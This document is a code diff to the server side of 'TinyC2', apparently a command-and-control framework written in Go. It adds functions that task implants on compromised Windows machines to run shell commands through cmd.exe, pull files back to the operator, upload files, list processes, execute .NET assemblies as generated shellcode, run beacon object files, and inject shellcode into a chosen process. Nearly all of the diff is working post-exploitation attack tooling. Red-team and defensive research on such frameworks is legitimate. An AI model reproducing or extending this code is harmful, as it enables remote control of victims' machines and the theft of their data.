@@ -4,8 +4,14 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
 	"time"
+
 	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
+	"github.com/0xPrimo/TinyC2/server/internal/pkg/pack"
 
 	"github.com/pterm/pterm"
 )
@@ -76,14 +82,137 @@ func (e *Engine) ImplantHandleResponse(id uint32, tasks map[string]any) ([]byte,
 	return e.ImplantTaskQueue(id), nil
 }
 
+/*
+ */
+type ProcessInfo struct {
+	Name    string `json:"name"`
+	Account string `json:"account"`
+	Pid     uint32 `json:"pid"`
+	PPid    uint32 `json:"ppid"`
+}
+
+type FileInfo struct {
+	Name string `json:"name"`
+	Size uint32 `json:"size"`
+	Data string `json:"data"`
+}
+
+type JobInfo struct {
+	ID uint32 `json:"id"`
+}
+
 func (e *Engine) ImplantTaskHandler(id uint32, task map[string]any) error {
 	implant, _ := e.Implants[id]
 	implant.Seen = time.Now()
 	e.Implants[id] = implant
 
-	// handle implant task response
 	if task["output"] != nil {
 		logger.Success("received output:\n%s\n", task["output"])
+	}
+
+	// post command processing
+	switch task["name"] {
+	case "download":
+		var file FileInfo
+
+		if task["artifact"] == nil {
+			return nil
+		}
+
+		err := json.Unmarshal([]byte(task["artifact"].(string)), &file)
+		if err != nil {
+			logger.Error("Error occurred during unmarshaling: %v", err)
+			return nil
+		}
+
+		data, err := base64.StdEncoding.DecodeString(file.Data)
+		if err != nil {
+			logger.Error("Failed to decode base64: %v", err)
+			return nil
+		}
+
+		err = os.MkdirAll("uploads", 0755)
+		if err != nil {
+			logger.Error("Failed to create directory: %v", err)
+			return nil
+		}
+
+		var filename string
+		slshindex := strings.LastIndex(file.Name, `\`)
+		if slshindex == -1 {
+			filename = file.Name
+		} else {
+			filename = file.Name[slshindex+1:]
+		}
+
+		dest := filepath.Join(
+			"uploads",
+			filename,
+		)
+		err = os.WriteFile(dest, data, 0644)
+		if err != nil {
+			logger.Error("Failed to write to file: %v", err)
+			return nil
+		}
+	case "ps":
+		var pslist []ProcessInfo
+		err := json.Unmarshal([]byte(task["artifact"].(string)), &pslist)
+		if err != nil {
+			logger.Error("Error occurred during unmarshaling: %v", err)
+			return nil
+		}
+
+		table := pterm.TableData{
+			{"PPID", "PID", "Account", "Name"},
+		}
+
+		for _, ps := range pslist {
+			table = append(table, []string{
+				pterm.Cyan(fmt.Sprintf("%d", ps.PPid)),
+				pterm.Cyan(fmt.Sprintf("%d", ps.Pid)),
+				pterm.Cyan(ps.Account),
+				pterm.Cyan(ps.Name),
+			})
+		}
+
+		pterm.Println()
+		pterm.DefaultTable.
+			WithHasHeader().
+			WithBoxed().
+			WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
+			WithData(table).
+			Render()
+		pterm.Println()
+
+		return nil
+	case "job.list":
+		var joblist []JobInfo
+		err := json.Unmarshal([]byte(task["artifact"].(string)), &joblist)
+		if err != nil {
+			logger.Error("Error occurred during unmarshaling: %v", err)
+			return nil
+		}
+
+		table := pterm.TableData{
+			{"ID"},
+		}
+
+		for _, job := range joblist {
+			table = append(table, []string{
+				pterm.Cyan(fmt.Sprintf("%X", job.ID)),
+			})
+		}
+
+		pterm.Println()
+		pterm.DefaultTable.
+			WithHasHeader().
+			WithBoxed().
+			WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
+			WithData(table).
+			Render()
+		pterm.Println()
+
+		return nil
 	}
 
 	return nil
@@ -92,7 +221,7 @@ func (e *Engine) ImplantTaskHandler(id uint32, task map[string]any) error {
 func (e *Engine) ImplantTaskExecute(id uint32, task map[string]any) {
 	implant, exists := e.Implants[id]
 	if !exists {
-		logger.Error("implant %X does not exists", pterm.Cyan(id))
+		logger.Error("implant %s does not exists", pterm.Cyan(id))
 		return
 	}
 
@@ -319,13 +448,194 @@ func (e *Engine) ImplantChannelRemove(id uint32, name string) error {
 	return nil
 }
 
-func (e *Engine) ImplantWhoami(id uint32) error {
-	// execute whoami command
+func (e *Engine) ImplantJobStop(id uint32, jobid uint32) error {
+
+	// execute job.stop command
 	e.ImplantTaskExecute(id, map[string]any{
-		"name":     "whoami",
+		"name":     "job.stop",
+		"args":     []uint32{jobid},
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantJobList(id uint32) error {
+
+	// execute job.stop command
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "job.list",
 		"args":     nil,
 		"artifact": nil,
 	})
 
 	return nil
+}
+
+// ImplantPs
+func (e *Engine) ImplantPs(id uint32) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "ps",
+		"args":     nil,
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantCd(id uint32, directory string) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "cd",
+		"args":     []string{directory},
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantCp(id uint32, src string, dest string) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "cp",
+		"args":     []string{src, dest},
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantShell(id uint32, command string) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "shell",
+		"args":     []string{"C:\\Windows\\System32\\cmd.exe /c " + command},
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantDownload(id uint32, path string) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "download",
+		"args":     []string{path},
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantUpload(id uint32, src string, dest string) error {
+	data, err := os.ReadFile(src)
+	if err != nil {
+		logger.Error("failed to read file: %v", err)
+		return err
+	}
+
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "upload",
+		"args":     []string{dest},
+		"artifact": base64.StdEncoding.EncodeToString(data),
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantRun(id uint32, commandline string) error {
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "run",
+		"args":     []string{commandline},
+		"artifact": nil,
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantExecuteAssembly(id uint32, dotnet string, cmdargs string) error {
+	args := []string{
+		"-Dcrystalpalace.verbose=false",
+		"-jar",
+		e.Config.CrystalPalace.Lib,
+		"buildPic",
+		filepath.Join(e.Config.CrystalPalace.Pavilion, "execute-assembly-pico/runner.spec"),
+		"x64",
+		"/tmp/runner.bin",
+		`%ASSEMBLY_PATH=` + dotnet,
+		`%CMDLINE=` + cmdargs,
+	}
+
+	cmd := exec.Command("java", args...)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	if err := cmd.Run(); err != nil {
+		logger.Error("configuration failed: %v", err)
+		return nil
+	}
+
+	// read shellcode
+	pic, err := os.ReadFile("/tmp/runner.bin")
+	if err != nil {
+		logger.Error("failed to read implant exe: %v", err)
+		return nil
+	}
+
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "execute-assembly",
+		"args":     nil,
+		"artifact": base64.StdEncoding.EncodeToString(pic),
+	})
+
+	return nil
+}
+
+func (e *Engine) ImplantInlineExecute(id uint32, bof string, bofargs []byte) {
+	// read bof
+	bofraw, err := os.ReadFile(bof)
+	if err != nil {
+		logger.Error("failed to read beacon object file: %v", err)
+		return
+	}
+
+	// execute task
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "inline-execute",
+		"args":     []string{base64.StdEncoding.EncodeToString(bofargs)},
+		"artifact": base64.StdEncoding.EncodeToString(bofraw),
+	})
+}
+
+func (e *Engine) ImplantInlineExecuteEx(id uint32, bof string, packorder string, args []string) {
+	// read bof
+	bofraw, err := os.ReadFile(bof)
+	if err != nil {
+		logger.Error("failed to read beacon object file: %v", err)
+		return
+	}
+
+	// pack arguments
+	bofargs, err := pack.BofPack(packorder, args)
+	if err != nil {
+		logger.Error("failed to pack beacon object file arguments: %v", err)
+		return
+	}
+
+	// execute task
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "inline-execute",
+		"args":     []string{base64.StdEncoding.EncodeToString(bofargs)},
+		"artifact": base64.StdEncoding.EncodeToString(bofraw),
+	})
+}
+
+func (e *Engine) ImplantInjectShellcode(id uint32, pid int, path string) {
+	payload, err := os.ReadFile(path)
+	if err != nil {
+		logger.Error("failed to read beacon object file: %v", err)
+		return
+	}
+
+	// execute task
+	e.ImplantTaskExecute(id, map[string]any{
+		"name":     "inject-shellcode",
+		"args":     []int{pid},
+		"artifact": base64.StdEncoding.EncodeToString(payload),
+	})
 }
